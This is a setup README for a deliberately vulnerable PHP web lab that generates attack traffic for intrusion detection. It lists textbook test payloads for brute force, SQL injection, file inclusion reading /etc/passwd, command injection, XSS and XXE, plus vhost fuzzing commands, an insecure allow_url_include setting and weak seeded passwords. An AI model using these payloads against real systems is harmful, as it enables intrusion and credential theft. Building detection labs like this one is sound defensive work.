# PacketFeeder Lab — Vulnerable Web App Setup

> **WARNING**: This application is intentionally vulnerable. Deploy ONLY in isolated lab environments. Never expose to the internet or production networks.

## Prerequisites

- Debian/Ubuntu with nginx
- PHP 8.x with php-fpm and modules: `php-mysql`, `php-xml`
- MariaDB/MySQL
- Network monitored by Snort/Suricata/ClearNDR

## Install

```bash
apt update && apt install -y nginx php-fpm php-mysql php-xml mariadb-server
```

## Database Setup

```bash
# Start MariaDB
systemctl enable --now mariadb

# Create database and user
mysql -u root <<'SQL'
CREATE DATABASE IF NOT EXISTS packetfeeder_lab;
CREATE USER IF NOT EXISTS 'packetfeeder'@'127.0.0.1' IDENTIFIED BY 'packetfeeder';
GRANT ALL PRIVILEGES ON packetfeeder_lab.* TO 'packetfeeder'@'127.0.0.1';
FLUSH PRIVILEGES;
SQL
```

## Deploy

```bash
# Copy app to web root
cp -r lab/debian-web /var/www/html/packetfeeder-lab

# Set permissions
chown -R www-data:www-data /var/www/html/packetfeeder-lab
chmod 755 /var/www/html/packetfeeder-lab
```

## Enable RFI (optional)

Edit `/etc/php/8.*/fpm/php.ini`:

```ini
allow_url_include = On
```

Then restart php-fpm:

```bash
systemctl restart php8.*-fpm
```

## Access

- URL: `http://<server-ip>/packetfeeder-lab/`
- Default login: `admin` / `admin123`

## Modules & MITRE Mapping

| Module                   | File        | Technique | CWE     |
| ------------------------ | ----------- | --------- | ------- |
| Brute Force Login        | `index.php` | T1110     | CWE-307 |
| SQL Injection            | `sqli.php`  | T1190     | CWE-89  |
| Local File Inclusion     | `lfi.php`   | T1005     | CWE-98  |
| Remote File Inclusion    | `rfi.php`   | T1059.004 | CWE-98  |
| Command Injection        | `cmdi.php`  | T1059     | CWE-78  |
| XSS (Reflected + Stored) | `xss.php`   | T1059.007 | CWE-79  |
| XXE Injection            | `xxe.php`   | T1059     | CWE-611 |

## Test Commands

```bash
# Brute force
hydra -l admin -P wordlist.txt http-post-form "/packetfeeder-lab/index.php:username=^USER^&password=^PASS^:Invalid"

# SQL Injection
curl 'http://TARGET/packetfeeder-lab/sqli.php?id=1%20UNION%20SELECT%201,username,password,role%20FROM%20users--' -b 'PHPSESSID=xxx'

# LFI
curl 'http://TARGET/packetfeeder-lab/lfi.php?file=../../../etc/passwd' -b 'PHPSESSID=xxx'

# Command Injection
curl 'http://TARGET/packetfeeder-lab/cmdi.php?ip=;id' -b 'PHPSESSID=xxx'

# XSS Reflected
curl 'http://TARGET/packetfeeder-lab/xss.php?q=<script>alert(1)</script>' -b 'PHPSESSID=xxx'

# XXE
curl -X POST -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><user><name>&xxe;</name></user>' -b 'PHPSESSID=xxx' http://TARGET/packetfeeder-lab/xxe.php
```

## Vhost Scanning Setup (T1595.003)

The `vhosts/` directory contains a multi-vhost nginx setup for generating vhost enumeration traffic (gobuster vhost, ffuf, wfuzz). 5 discoverable vhosts + 1 default catch-all returning 404.

| Vhost                         | Response | Content                                    |
| ----------------------------- | -------- | ------------------------------------------ |
| `packetfeeder.lab`            | 302      | Redirects to `/packetfeeder-lab/`          |
| `admin.packetfeeder.lab`      | 200      | Fake admin panel with info leak            |
| `api.packetfeeder.lab`        | 200      | Fake REST API with JSON routes             |
| `dev.packetfeeder.lab`        | 200      | Staging page with phpinfo(), .git leak     |
| `monitoring.packetfeeder.lab` | 200      | Fake monitoring dashboard                  |
| `intranet.packetfeeder.lab`   | 200      | Directory listing with sensitive filenames |
| `*.packetfeeder.lab`          | 404      | Catch-all for unknown vhosts               |

### Deploy vhosts

```bash
# Copy vhost pages
sudo cp -r lab/debian-web/vhosts /var/www/html/packetfeeder-lab/vhosts
sudo chown -R www-data:www-data /var/www/html/packetfeeder-lab/vhosts

# Replace default nginx config with vhosts config
sudo cp /etc/nginx/sites-available/default /etc/nginx/sites-available/default.bak
sudo cp lab/debian-web/vhosts/vhosts.conf /etc/nginx/sites-available/default
sudo nginx -t && sudo systemctl reload nginx
```

### DNS setup

Add entries in pfSense DNS Resolver (or attacker `/etc/hosts`):

```
10.10.10.40 packetfeeder.lab admin.packetfeeder.lab api.packetfeeder.lab dev.packetfeeder.lab monitoring.packetfeeder.lab intranet.packetfeeder.lab
```

### Test commands

```bash
# Verify discoverable vhost returns 200
curl -s -o /dev/null -w "%{http_code}" -H "Host: admin.packetfeeder.lab" http://10.10.10.40/
# → 200

# Verify unknown vhost returns 404
curl -s -o /dev/null -w "%{http_code}" -H "Host: fake.packetfeeder.lab" http://10.10.10.40/
# → 404

# Scan with gobuster
gobuster vhost -u http://packetfeeder.lab -w /usr/share/wordlists/subdomains.txt --append-domain

# Scan with ffuf (filter 404)
ffuf -u http://10.10.10.40 -H "Host: FUZZ.packetfeeder.lab" -w /usr/share/wordlists/subdomains.txt -fc 404
```

---

## User Accounts (seeded)

| Username | Password    | Role     |
| -------- | ----------- | -------- |
| admin    | admin123    | admin    |
| operator | operator1   | operator |
| analyst  | analyst2024 | analyst  |
| guest    | guest       | guest    |
| john     | password    | user     |
| jane     | letmein     | user     |
| bob      | qwerty      | user     |
| alice    | 123456      | user     |
| ftpuser  | ftp1234     | service  |
| smbuser  | smb1234     | service  |
